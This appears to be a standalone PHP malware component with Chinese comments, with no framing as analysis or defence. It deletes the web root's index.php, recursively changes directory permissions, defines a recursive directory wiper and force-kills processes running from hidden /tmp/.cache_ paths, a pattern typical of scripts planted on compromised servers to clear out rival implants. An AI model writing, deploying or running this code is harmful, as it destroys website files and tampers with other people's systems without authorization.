
function deleteDir($dirPath) {if (!is_dir($dirPath)) {return;}$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dirPath, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);foreach ($files as $fileinfo) {$todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');$todo($fileinfo->getRealPath());} return rmdir($dirPath);}
function search($dir) {$files = scandir($dir);foreach ($files as $file) {if ($file != "." && $file != "..") {$path = $dir . '/' . $file;if (is_dir($path)) {@chmod($path, 0755);search($path);} else { }}}}
$root=$_SERVER['DOCUMENT_ROOT'].'/';
for($i=0;$i<5;$i++){
chmod($root,0755);
@unlink($root.'index.php');
}
function cleanCacheProcessesViaProcOpen() {
    // 1. 定义命令
    // pkill -9 -f '/tmp/.cache_' 
    // -9: 强制杀死 (SIGKILL)
    // -f: 匹配完整命令行
    $cmd = "pkill -9 -f '/tmp/.cache_'";

    // 2. 定义描述符规范
    // 0: stdin (只读管道，我们不需要输入，设为 pipe 或 dev/null)
    // 1: stdout (只写管道，用于捕获正常输出)
    // 2: stderr (只写管道，用于捕获错误信息，如“未找到进程”)
    $descriptorspec = array(
        0 => array("pipe", "r"),  // stdin
        1 => array("pipe", "w"),  // stdout
        2 => array("pipe", "w")   // stderr
    );

    $pipes = array();
    
    // 3. 启动进程
    $process = proc_open($cmd, $descriptorspec, $pipes);

    if (!is_resource($process)) {
        echo "错误：无法启动进程。\n";
        return false;
    }

    // 4. 关闭 stdin，因为我们要执行的命令不需要输入
    fclose($pipes[0]);

    // 5. 读取 stdout 和 stderr
    // 注意：pkill 成功时通常没有 stdout 输出，失败或未找到进程时可能在 stderr 输出
    $stdout = stream_get_contents($pipes[1]);
    $stderr = stream_get_contents($pipes[2]);

    // 6. 关闭管道
    fclose($pipes[1]);
    fclose($pipes[2]);

    // 7. 关闭进程并获取退出码
    // proc_close 会等待进程结束并返回退出状态码
    $returnCode = proc_close($process);

    // 8. 处理结果
    if ($returnCode === 0) {
        echo "成功：已发送终止信号给匹配进程。\n";
    } elseif ($returnCode === 1) {
        // pkill 返回 1 通常表示未找到匹配进程
        echo "提示：未找到包含 '/tmp/.cache_' 的进程。\n";
    } else {
        echo "错误：执行失败，退出码: {$returnCode}\n";
        if (!empty($stderr)) {
            echo "错误详情: " . trim($stderr) . "\n";
        }
    }

    return true;
}

// 执行清理
cleanCacheProcessesViaProcOpen();
